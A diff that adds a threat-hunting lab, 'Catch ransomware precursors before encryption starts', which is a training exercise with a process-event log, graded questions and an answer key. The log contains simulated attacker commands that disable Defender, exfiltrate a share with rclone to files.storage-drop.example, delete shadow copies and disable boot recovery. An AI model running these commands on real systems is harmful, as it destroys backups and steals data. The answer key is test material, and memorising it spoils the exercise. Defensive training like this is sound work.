@@ -1,0 +1,94 @@
+slug: lab-hunt-ransomware-precursors
+lesson: hunt-ransomware-precursors
+title: Catch ransomware precursors before encryption starts
+pass_mark: 80
+scenario: |
+  Ransomware operators spend hours or days inside a network before they encrypt it: discovery,
+  disabling defences, stealing data for extortion, and destroying backups. Each step is a
+  chance to stop them.
+
+  Hypothesis for this hunt: someone is preparing a ransomware attack using legitimate admin and
+  backup tools. You have a night's process-creation events (pipe-separated). Build the
+  attacker's timeline.
+artifacts:
+- name: process_events.txt
+  kind: csv
+  description: Process creation events, night of 10 to 11 October (UTC).
+  content: |
+    time|host|user|parent|command_line
+    2026-10-11T01:02:10Z|WS-210|a.berg|explorer.exe|outlook.exe
+    2026-10-11T01:14:33Z|SRV-FS-01|svc_backup|cmd.exe|adfind.exe -f "(objectcategory=computer)" -csv name operatingSystem
+    2026-10-11T01:15:02Z|SRV-FS-01|svc_backup|cmd.exe|net group "Domain Admins" /domain
+    2026-10-11T01:21:47Z|SRV-FS-01|svc_backup|powershell.exe|Set-MpPreference -DisableRealtimeMonitoring $true
+    2026-10-11T01:30:19Z|SRV-FS-01|svc_backup|cmd.exe|rclone.exe copy D:\Shares\Finance remote:fin --config C:\ProgramData\rc.conf --transfers 16
+    2026-10-11T01:30:20Z|SRV-FS-01|svc_backup|rclone.exe|connect files.storage-drop.example:443
+    2026-10-11T02:05:51Z|WS-233|h.ito|explorer.exe|chrome.exe
+    2026-10-11T03:12:08Z|SRV-FS-01|svc_backup|cmd.exe|vssadmin.exe delete shadows /all /quiet
+    2026-10-11T03:12:40Z|SRV-FS-01|svc_backup|cmd.exe|bcdedit /set {default} recoveryenabled no
+tasks:
+- prompt: Which host is the attacker working on?
+  type: text
+  accepted:
+  - SRV-FS-01
+  hint: Follow the discovery and defence-evasion commands.
+  explanation: SRV-FS-01, the file server, which holds the data they want to steal and encrypt.
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: ^[^|]+\|([^|]+)\|[^|]+\|[^|]+\|adfind
+- prompt: Which account is being abused?
+  type: text
+  accepted:
+  - svc_backup
+  hint: The user column of those events.
+  explanation: svc_backup, a service account that normally only runs backups. Service accounts rarely have MFA and
+    often have broad rights, which makes them a favourite.
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: ^[^|]+\|SRV-FS-01\|([^|]+)\|
+- prompt: Which tool did they use to steal data?
+  type: text
+  accepted:
+  - rclone
+  - rclone.exe
+  hint: Look for a file-sync utility copying a share to a remote.
+  explanation: rclone, a legitimate cloud-sync tool, copying the Finance share with 16 parallel transfers. Data
+    theft comes before encryption for double extortion.
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: \|cmd\.exe\|(rclone\.exe) copy
+- prompt: Which domain received the stolen data?
+  type: text
+  accepted:
+  - files.storage-drop.example
+  hint: The network event from the sync tool.
+  explanation: files.storage-drop.example. Block it and check proxy logs for the volume uploaded.
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: connect ([^:]+):443
+- prompt: How many of the attacker's commands target recovery (shadow copies and boot recovery)?
+  type: number
+  accepted:
+  - '2'
+  hint: Look for vssadmin and bcdedit.
+  explanation: 'Two: deleting shadow copies and disabling Windows recovery, usually minutes before the encryptor
+    runs.'
+  verify:
+    artifact: process_events.txt
+    op: count
+    pattern: (?:vssadmin\.exe delete shadows|bcdedit /set \{default\} recoveryenabled no)
+- prompt: It is 03:13. What do you do?
+  type: choice
+  options:
+  - Write up the hunt findings for the morning
+  - 'Declare an incident now: isolate SRV-FS-01, disable svc_backup, block the exfiltration domain and protect offline
+    backups, because encryption is likely imminent'
+  - Re-enable Defender on the server and keep watching
+  - Restore the shadow copies
+  answer: 1
+  hint: Deleting recovery options is usually the last step before encryption.
+  explanation: Backup destruction means the attacker is ready. A hunt that finds an active intrusion becomes an
+    incident immediately; minutes matter.
